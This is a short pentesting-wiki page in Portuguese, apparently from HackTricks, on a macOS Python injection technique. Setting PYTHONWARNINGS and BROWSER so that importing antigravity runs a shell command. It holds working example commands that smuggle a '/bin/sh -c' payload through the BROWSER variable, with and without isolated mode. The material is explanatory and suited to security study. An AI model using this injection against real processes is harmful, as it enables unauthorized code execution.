# Injeção de aplicações Python no macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via as variáveis de ambiente `PYTHONWARNINGS` e `BROWSER`

Se um atacante puder controlar o ambiente de um processo Python, a combinação de `PYTHONWARNINGS` e `BROWSER` poderá acionar a execução de comandos quando o Python importar o módulo `antigravity` ao processar uma opção de warning criada de forma maliciosa. A técnica depende de `antigravity` abrir uma URL com o módulo `webbrowser` do Python, que respeita a variável de ambiente `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Hacking com Variáveis de Ambiente - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
